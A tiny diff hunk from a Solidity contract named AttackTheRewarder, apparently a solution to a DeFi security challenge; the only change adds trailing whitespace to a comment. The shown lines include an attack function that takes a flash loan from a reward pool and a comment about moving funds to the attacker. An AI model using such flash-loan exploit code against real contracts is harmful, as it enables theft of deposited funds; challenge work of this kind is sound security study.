@@ -22,7 +22,7 @@ contract AttackTheRewarder {
     }
 
     function attack(uint256 amount) public {
-        // Initiate flash loan and trigger receiveFlashLoan()
+        // Initiate flash loan and trigger receiveFlashLoan() 
         pool.flashLoan(amount);
 
         // Transfer fund to attacker
